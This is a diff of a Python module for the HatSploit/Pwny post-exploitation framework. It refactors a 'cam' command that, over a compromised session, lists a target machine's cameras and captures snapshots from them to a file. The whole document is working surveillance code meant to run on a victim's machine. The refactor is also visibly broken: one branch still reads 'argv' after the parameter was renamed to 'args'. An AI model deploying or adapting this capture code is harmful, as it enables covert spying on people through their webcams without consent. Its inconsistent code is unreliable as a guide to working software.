@@ -6,7 +6,7 @@ Current source: https://github.com/EntySec/HatSploit
 from pwny.api import *
 from pwny.types import *
 
-from hatsploit.lib.command import Command
+from badges.cmd import Command
 
 CAM_BASE = 5
 
@@ -18,11 +18,9 @@ CAM_STOP = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 3)
 CAM_ID = tlv_custom_type(TLV_TYPE_INT, CAM_BASE, API_TYPE)
 
 
-class HatSploitCommand(Command):
+class ExternalCommand(Command):
     def __init__(self):
-        super().__init__()
-
-        self.details = {
+        super().__init__({
             'Category': "gather",
             'Name': "cam",
             'Authors': [
@@ -32,13 +30,13 @@ class HatSploitCommand(Command):
             'Usage': "cam <option> [arguments]",
             'MinArgs': 1,
             'Options': {
-                '-l': ['', 'List all camera devices.'],
-                '-s': ['<id> <path>', 'Take a snapshot using device.'],
+                'list': ['', 'List all camera devices.'],
+                'snap': ['<id> <path>', 'Take a snapshot using device.'],
             }
-        }
+        })
 
-    def run(self, argc, argv):
-        if argv[1] == '-l':
+    def run(self, args):
+        if args[1] == 'list':
             result = self.session.send_command(
                 tag=CAM_LIST
             )
@@ -52,16 +50,16 @@ class HatSploitCommand(Command):
 
                 device = result.get_string(TLV_TYPE_STRING)
 
-        elif argv[1] == '-s':
+        elif argv[1] == 'snap':
             result = self.session.send_command(
                 tag=CAM_START,
                 args={
-                    CAM_ID: int(argv[2]),
+                    CAM_ID: int(args[2]),
                 }
             )
 
             if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                self.print_error(f"Failed to open device #{argv[2]}!")
+                self.print_error(f"Failed to open device #{args[2]}!")
                 return
 
             result = self.session.send_command(
@@ -69,16 +67,16 @@ class HatSploitCommand(Command):
             )
 
             if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                self.print_error(f"Failed to read device #{argv[2]}!")
+                self.print_error(f"Failed to read device #{args[2]}!")
                 self.session.send_command(tag=CAM_STOP)
                 return
 
             frame = result.get_raw(TLV_TYPE_BYTES)
 
             try:
-                with open(argv[3], 'wb') as f:
+                with open(args[3], 'wb') as f:
                     f.write(frame)
             except Exception:
-                self.print_error(f"Failed to write image to {argv[3]}!")
+                self.print_error(f"Failed to write image to {args[3]}!")
 
             self.session.send_command(tag=CAM_STOP)
